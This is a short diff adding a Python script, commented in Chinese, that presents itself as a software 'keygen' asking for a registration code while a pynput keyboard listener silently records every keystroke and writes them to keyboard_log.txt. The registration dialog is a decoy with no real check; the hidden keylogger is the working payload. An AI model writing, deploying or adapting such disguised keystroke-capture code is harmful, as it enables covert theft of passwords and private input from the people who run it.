@@ -1,0 +1,40 @@
+import pymsgbox
+from pynput import keyboard
+keys=[]
+def keygen():
+    # 定义注册机窗口的标题和消息
+    title = '注册机'
+    message = '请输入您的注册码：'
+
+    # 创建注册机窗口并获取用户输入的注册码
+    registration_code = pymsgbox.prompt(message, title)
+
+    # 判断用户输入的注册码是否为空
+    if registration_code == '':
+        pymsgbox.alert('注册码不能为空！', title)
+    # 退出注册机
+    elif registration_code == None:
+        exit(0)
+    else:
+        # 处理用户输入的注册码
+        pymsgbox.alert('注册成功！', title)
+Keyboard=keyboard.Controller #实例化键盘对象
+
+def on_press(key):  # 按键被按压调用这个函数
+    # 输出按压的按键名字
+    try:
+        keys.append(key.char)
+        print('{0} pressed'.format(key))
+    except AttributeError:
+        # 如果按键不是可打印字符，将其名称加入到列表中
+        keys.append(str(key))
+
+
+if __name__ == '__main__':
+    # 连接事件以及释放
+    listener = keyboard.Listener(on_press=on_press,)
+    listener.start()
+    keygen()
+    with open("keyboard_log.txt", "w") as f:
+        f.write("".join(keys))
+    
